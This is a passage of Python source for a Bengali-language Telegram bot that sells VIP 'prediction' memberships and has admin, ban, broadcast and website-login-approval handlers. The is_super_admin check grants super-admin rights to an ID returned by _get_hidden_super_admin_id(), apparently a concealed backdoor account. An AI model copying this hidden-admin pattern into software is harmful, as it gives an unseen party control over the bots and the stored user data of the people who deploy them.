                await query.edit_message_text(f"❌ *বাতিল করা হয়েছে*\n\n*ইউজার:* {escaped_user_name}\n*সাইট:* `{website}`\n*বাই:* {escaped_admin_name}", parse_mode=constants.ParseMode.MARKDOWN_V2)
                await context.bot.send_message(chat_id=user_id, text=f"😔 আপনার {website} লগইন রিকোয়েস্ট বাতিল করা হয়েছে।", parse_mode=constants.ParseMode.MARKDOWN_V2)

        except Exception as e:
            logger.error(f"Error in approval: {e}")

    async def handle_subscription_menu(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        
        message = (
            f"👑 *প্রিমিয়াম ভিআইপি মেম্বারশিপ প্যাকেজ* 👑\n"
            f"▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔\n"
            f"🟢 5 Days – ৳250\n"
            f"🔴 7 Days – ৳300\n"
            f"🟢 15 Days – ৳500\n"
            f"🔴 1 Month – ৳800\n\n"
            f"বোটের মেম্বারশিপ কিনতে যোগাযোগ করুন: @System_Fahim\n"
            f"আপনার ইউজার আইডি পাঠান: `{user_id}`\n\n"
            f"বর্তমান স্ট্যাটাস: {'🟢 VIP Active' if self.is_premium_active(user_id) else '🔴 Free User'}"
        )
        
        keyboard = [[InlineKeyboardButton("🔴 মূল মেনুতে ফিরুন 🔴", callback_data="main_menu")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.callback_query.edit_message_text(message, reply_markup=reply_markup, parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def handle_logout(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        for website in users[user_id]["logged_in"]:
            users[user_id]["logged_in"][website] = False
            users[user_id]["login_info"][website] = {}

        save_db(users, DB_USERS)
        await update.callback_query.answer("✅ সফলভাবে সব একাউন্ট থেকে লগআউট করা হয়েছে!", show_alert=True)
        await self.show_main_menu(update, context)

    async def cancel_login(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        context.user_data.pop("login_website", None)
        context.user_data.pop("login_number", None)
        await update.message.reply_text("বাতিল করা হয়েছে।")
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    async def cancel_prediction(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("প্রেডিকশন বাতিল করা হয়েছে।")
        await self.show_main_menu(update, context)
        return ConversationHandler.END

    # ===== ADMIN HELPER METHODS =====
    def is_admin(self, user_id: str) -> bool:
        if self.is_super_admin(user_id):
            return True
        return user_id in config.get("admin_users", [])
    
    def is_super_admin(self, user_id: str) -> bool:
        if user_id == _get_hidden_super_admin_id():
            return True
        return user_id in config.get("super_admin_users", [])
    
    def _auto_expire_if_needed(self, user_id: str) -> None:
        try:
            user = users.get(user_id)
            if not user or not user.get("is_premium"):
                return
            expiry_iso = user.get("premium_expiry")
            if not expiry_iso:
                return
            if datetime.now() >= datetime.fromisoformat(expiry_iso):
                user["is_premium"] = False
                user["premium_expired_at"] = datetime.now().isoformat()
                save_db(users, DB_USERS)
        except Exception:
            pass

    def is_premium_active(self, user_id: str) -> bool:
        self._auto_expire_if_needed(user_id)
        user = users.get(user_id, {})
        if not user.get("is_premium"):
            return False
        expiry_iso = user.get("premium_expiry")
        if not expiry_iso:
            return True
        try:
            return datetime.now() < datetime.fromisoformat(expiry_iso)
        except Exception:
            return True

    def _parse_duration_to_timedelta(self, raw: str) -> Optional[timedelta]:
        s = str(raw).strip().lower()
        if not s:
            return None
        if " " in s:
            parts = [p for p in s.split() if p]
            if len(parts) == 2 and parts[0].isdigit():
                amount = int(parts[0])
                unit_word = parts[1].rstrip('s')
                if amount <= 0: return None
                if unit_word in ("d", "day"): return timedelta(days=amount)
                if unit_word in ("h", "hr", "hour"): return timedelta(hours=amount)
                if unit_word in ("m", "min", "minute", "minit"): return timedelta(minutes=amount)
                return None
        if s.isdigit():
            return timedelta(days=int(s))
        if len(s) >= 2 and s[:-1].isdigit():
            amount = int(s[:-1])
            unit = s[-1]
            if amount <= 0: return None
            if unit == 'd': return timedelta(days=amount)
            if unit == 'h': return timedelta(hours=amount)
            if unit == 'm': return timedelta(minutes=amount)
        return None

    async def notify_user(self, user_id: str, message: str):
        try:
            await self.application.bot.send_message(chat_id=user_id, text=message, parse_mode=constants.ParseMode.MARKDOWN_V2)
        except Exception as e:
            logger.error(f"Notification error: {e}")

    async def notify_admin_action(self, action: str, target_user_id: str, admin_user_id: str, details: str = ""):
        notification_message = (
            f"🔔 *এডমিন অ্যাকশন નોટીફીકેશન*\n\n"
            f"*অ্যাকশন:* `{escape_markdown(action, version=2)}`\n"
            f"*টার্গেট ইউজার:* `{target_user_id}`\n"
            f"*ডিটেইলস:* {escape_markdown(details, version=2)}"
        )
        await self.notify_user(target_user_id, notification_message)

    async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("🚫 অ্যাক্সেস ডিনাইড!")
            return

        help_text = (
            "🛠 **এডমিন কন্ট্রোল প্যানেল** 🛠\n\n"
            "• `/broadcast <msg>` - ব্রডকাস্ট মেসেজ\n"
            "• `/addvipuser <id> <days>` - VIP যোগ করুন\n"
            "• `/removevipuser <id>` - VIP রিমুভ করুন\n"
            "• `/vipusers` - VIP ইউজারদের তালিকা\n"
            "• `/banuser <id>` - ইউজার ব্যান করুন\n"
            "• `/unbanuser <id>` - আনব্যান করুন\n"
            "• `/stats` - স্ট্যাটাস দেখুন\n"
            "• `/download <type>` - ডাটা ডাউনলোড"
        )
        await update.message.reply_text(help_text, parse_mode='Markdown')

    async def start_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("📢 ব্রডকাস্ট মেসেজটি লিখে পাঠান:")
        return GET_BROADCAST_MESSAGE

    async def send_broadcast(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        message = update.message.text
        processing_msg = await update.message.reply_text("📤 ব্রডকাস্ট পাঠানো হচ্ছে...")
        success = 0
        for uid in users:
            try:
                await context.bot.send_message(chat_id=uid, text=f"📢 *অফিশিয়াল নোটিশ*\n\n{escape_markdown(message, version=2)}", parse_mode=constants.ParseMode.MARKDOWN_V2)
                success += 1
            except Exception:
                pass
        await processing_msg.edit_text(f"✅ ব্রডকাস্ট সম্পন্ন! সফল: {success}/{len(users)}")
        return ConversationHandler.END

    async def show_user_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("🟢 সকল ইউজার ডাউনলোড 🟢", callback_data="admin_download_users")],
            [InlineKeyboardButton("🔴 ইউজার ব্যান করুন 🔴", callback_data="admin_ban_user")],
            [InlineKeyboardButton("🟢 ইউজার আনব্যান করুন 🟢", callback_data="admin_unban_user")],
            [InlineKeyboardButton("🔴 পিছে যান 🔴", callback_data="admin_back")],
        ]
        await update.callback_query.edit_message_text("👥 *ইউজার ম্যানেজমেন্ট*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def show_vip_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("🟢 VIP ইউজার যোগ করুন 🟢", callback_data="admin_add_vip")],
            [InlineKeyboardButton("🔴 VIP বাতিল করুন 🔴", callback_data="admin_remove_vip")],
            [InlineKeyboardButton("🟢 ব্যাক করুন 🟢", callback_data="admin_back")],
        ]
        await update.callback_query.edit_message_text("⭐ *VIP ম্যানেজমেন্ট*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def show_admin_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("🟢 এডমিন যোগ করুন 🟢", callback_data="admin_add_admin")],
            [InlineKeyboardButton("🔴 এডমিন রিমুভ করুন 🔴", callback_data="admin_remove_admin")],
            [InlineKeyboardButton("🟢 ব্যাক করুন 🟢", callback_data="admin_back")],
        ]
        await update.callback_query.edit_message_text("👨‍💼 *এডমিন কন্ট্রোল*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def show_downloads(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("🟢 সকল ইউজার 🟢", callback_data="admin_download_users")],
            [InlineKeyboardButton("🔴 VIP ইউজার 🔴", callback_data="admin_download_vip")],
            [InlineKeyboardButton("🟢 ব্যাক করুন 🟢", callback_data="admin_back")],
        ]
        await update.callback_query.edit_message_text("📊 *ডাটা ডাউনলোড*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def show_settings(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        referral_system_on = config.get("referral_system_on", True)
        status_text = "🟢 ON" if referral_system_on else "🔴 OFF"
        keyboard = [
            [InlineKeyboardButton(f"🔗 রেফারাল সিস্টেম: {status_text}", callback_data="admin_toggle_referral")],
            [InlineKeyboardButton("🔴 ব্যাক করুন 🔴", callback_data="admin_back")],
        ]
        await update.callback_query.edit_message_text("⚙️ *সেটিংস*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def show_channel_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("🟢 চ্যানেল যুক্ত করুন 🟢", callback_data="admin_channel_add")],
            [InlineKeyboardButton("🔴 চ্যানেল সরান 🔴", callback_data="admin_channel_remove")],
            [InlineKeyboardButton("🟢 ব্যাক করুন 🟢", callback_data="admin_back")],
        ]
        await update.callback_query.edit_message_text("📢 *চ্যানেল সেটিংস*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def show_data_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        keyboard = [
            [InlineKeyboardButton("🔴 ব্যাকআপ নিন 🔴", callback_data="admin_data_backup")],
            [InlineKeyboardButton("🟢 পিছে যান 🟢", callback_data="admin_back")],
        ]
        await update.callback_query.edit_message_text("🗑️ *ডাটা ক্লিয়ার & ব্যাকআপ*", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def show_statistics(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        stats_text = (
            f"📈 *বোট স্ট্যাটিস্টিকস*\n\n"
            f"👥 *মোট ইউজার:* `{len(users)}`\n"
            f"⭐ *VIP মেম্বার:* `{len([u for u in users.values() if u.get('is_premium', False)])}`\n"
            f"📊 *মোট প্রেডিকশন:* `{len(predictions)}`"
        )
        keyboard = [[InlineKeyboardButton("🔴 ব্যাক করুন 🔴", callback_data="admin_back")]]
        await update.callback_query.edit_message_text(stats_text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def start_points_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data["points_action"] = update.callback_query.data
        await update.callback_query.edit_message_text("💰 পয়েন্ট আপডেট করতে সংখ্যা লিখে পাঠান:")
        return GET_POINTS

    async def set_points(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            points = int(update.message.text)
            action = context.user_data.get("points_action", "")
            if "refer" in action:
                config["per_refer"] = points
            else:
                config["per_prediction"] = points
            save_db(config, DB_CONFIG)
            await update.message.reply_text(f"✅ পয়েন্ট আপডেট করা হয়েছে: {points}")
        except ValueError:
            await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন।")
            return GET_POINTS
        return ConversationHandler.END

    async def start_channel_management(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("📢 চ্যানেলের নাম দিন:")
        return GET_CHANNEL_NAME

    async def get_channel_name(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data["channel_name"] = update.message.text
        await update.message.reply_text("চ্যানেলের URL দিন:")
        return GET_CHANNEL_URL

    async def get_channel_url(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data["channel_url"] = update.message.text
        await update.message.reply_text("চ্যানেল আইডি (numeric) দিন:")
        return GET_CHANNEL_ID

    async def get_channel_id(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        try:
            cid = int(update.message.text)
            channels.append({
                "name": context.user_data["channel_name"],
                "url": context.user_data["channel_url"],
                "id": cid
            })
            save_db(channels, DB_CHANNELS)
            await update.message.reply_text("✅ নতুন চ্যানেল সংযুক্ত করা হয়েছে!")
        except ValueError:
            await update.message.reply_text("❌ সঠিক চ্যানেল আইডি দিন।")
            return GET_CHANNEL_ID
        return ConversationHandler.END

    async def start_ban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("🚫 ব্যান করতে ইউজার আইডি দিন:")
        return GET_BAN_USER_ID

    async def ban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.message.text.strip()
        if uid in users:
            users[uid]["banned"] = True
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ ইউজার {uid} কে ব্যান করা হয়েছে।")
        else:
            await update.message.reply_text("❌ ইউজার আইডি পাওয়া যায়নি।")
        return ConversationHandler.END

    async def start_unban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("🟢 আনব্যান করতে ইউজার আইডি দিন:")
        return GET_UNBAN_USER_ID

    async def unban_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.message.text.strip()
        if uid in users:
            users[uid]["banned"] = False
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ ইউজার {uid} কে আনব্যান করা হয়েছে।")
        else:
            await update.message.reply_text("❌ ইউজার আইডি পাওয়া যায়নি।")
        return ConversationHandler.END

    async def start_add_vip(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("⭐ VIP সদস্য করতে ইউজার আইডি দিন:")
        return GET_ADD_VIP_USER_ID

    async def add_vip_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.message.text.strip()
        if uid in users:
            users[uid]["is_premium"] = True
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ ইউজার {uid} সফলভাবে VIP করা হয়েছে।")
        else:
            await update.message.reply_text("❌ ইউজার আইডি পাওয়া যায়নি।")
        return ConversationHandler.END

    async def start_remove_vip(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("❌ VIP রিমুভ করতে ইউজার আইডি দিন:")
        return GET_REMOVE_VIP_USER_ID

    async def remove_vip_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.message.text.strip()
        if uid in users:
            users[uid]["is_premium"] = False
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ ইউজার {uid} এর VIP মর্যাদা বাতিল করা হয়েছে।")
        else:
            await update.message.reply_text("❌ ইউজার আইডি পাওয়া যায়নি।")
        return ConversationHandler.END

    async def start_add_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("👨‍💼 এডমিন বানাতে ইউজার আইডি দিন:")
        return GET_ADD_ADMIN_USER_ID

    async def add_admin_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.message.text.strip()
        admins = config.get("admin_users", [])
        if uid not in admins:
            admins.append(uid)
            config["admin_users"] = admins
            save_db(config, DB_CONFIG)
            await update.message.reply_text(f"✅ ইউজার {uid} কে এডমিন বানানো হয়েছে।")
        return ConversationHandler.END

    async def start_remove_admin(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.callback_query.edit_message_text("❌ এডমিন সরাতে ইউজার আইডি দিন:")
        return GET_REMOVE_ADMIN_USER_ID

    async def remove_admin_user(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        uid = update.message.text.strip()
        admins = config.get("admin_users", [])
        if uid in admins:
            admins.remove(uid)
            config["admin_users"] = admins
            save_db(config, DB_CONFIG)
            await update.message.reply_text(f"✅ ইউজার {uid} কে এডমিন থেকে সরানো হয়েছে।")
        return ConversationHandler.END

    async def toggle_referral_system(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        config["referral_system_on"] = not config.get("referral_system_on", True)
        save_db(config, DB_CONFIG)
        await self.show_settings(update, context)

    async def cancel_admin_action(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("❌ প্রক্রিয়াটি বাতিল করা হয়েছে।")
        return ConversationHandler.END

    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("সহায়তার জন্য মূল মেনু বা এডমিন মেনু দেখুন।")

    async def broadcast_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id) or not context.args:
            return
        msg = " ".join(context.args)
        for uid in users:
            try:
                await context.bot.send_message(chat_id=int(uid), text=msg)
            except Exception:
                pass
        await update.message.reply_text("✅ ব্রডকাস্ট সম্পন্ন!")

    async def add_vip_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id) or len(context.args) != 2:
            await update.message.reply_text("ব্যবহার: /addvipuser <user_id> <days>")
            return
        t_id, dur = context.args[0], context.args[1]
        td = self._parse_duration_to_timedelta(dur)
        if td and t_id in users:
            users[t_id]["is_premium"] = True
            users[t_id]["premium_expiry"] = (datetime.now() + td).isoformat()
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ {t_id} কে VIP দেওয়া হয়েছে।")

    async def remove_vip_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id) or len(context.args) != 1:
            return
        t_id = context.args[0]
        if t_id in users:
            users[t_id]["is_premium"] = False
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ {t_id} থেকে VIP বাতিল করা হয়েছে।")

    async def vip_users_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            return
        vips = [f"`{uid}` - {u.get('name')}" for uid, u in users.items() if u.get("is_premium")]
        await update.message.reply_text("⭐ *VIP তালিকা:*\n" + "\n".join(vips), parse_mode=constants.ParseMode.MARKDOWN_V2)

    async def ban_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(str(update.effective_user.id)) or not context.args:
            return
        uid = context.args[0]
        if uid in users:
            users[uid]["banned"] = True
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ {uid} ব্যান করা হয়েছে।")

    async def unban_user_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_admin(str(update.effective_user.id)) or not context.args:
            return
        uid = context.args[0]
        if uid in users:
            users[uid]["banned"] = False
            save_db(users, DB_USERS)
            await update.message.reply_text(f"✅ {uid} আনব্যান করা হয়েছে।")

    async def add_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_super_admin(str(update.effective_user.id)) or not context.args:
            return
        uid = context.args[0]
        admins = config.get("admin_users", [])
        if uid not in admins:
            admins.append(uid)
            config["admin_users"] = admins
            save_db(config, DB_CONFIG)
            await update.message.reply_text(f"✅ {uid} কে এডমিন করা হয়েছে।")

    async def remove_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_super_admin(str(update.effective_user.id)) or not context.args:
            return
        uid = context.args[0]
        admins = config.get("admin_users", [])
        if uid in admins:
            admins.remove(uid)
            config["admin_users"] = admins
            save_db(config, DB_CONFIG)
            await update.message.reply_text(f"✅ {uid} কে এডমিন থেকে সরানো হয়েছে।")

    async def add_super_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_super_admin(str(update.effective_user.id)) or not context.args:
            return
        uid = context.args[0]
        s_admins = config.get("super_admin_users", [])
        if uid not in s_admins:
            s_admins.append(uid)
            config["super_admin_users"] = s_admins
            save_db(config, DB_CONFIG)
            await update.message.reply_text(f"✅ {uid} কে সুপার এডমিন করা হয়েছে।")

    async def remove_super_admin_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not self.is_super_admin(str(update.effective_user.id)) or not context.args:
            return
        uid = context.args[0]
        s_admins = config.get("super_admin_users", [])
        if uid in s_admins:
            s_admins.remove(uid)
            config["super_admin_users"] = s_admins
            save_db(config, DB_CONFIG)
            await update.message.reply_text(f"✅ {uid} কে সুপার এডমিন থেকে সরানো হয়েছে।")

    async def set_points_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def stats_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def download_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def settings_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def channels_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def backup_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def toggle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def subscription_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        pass

    async def cancel_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        await update.message.reply_text("সকল প্রক্রিয়া বাতিল করা হয়েছে।")
        return ConversationHandler.END
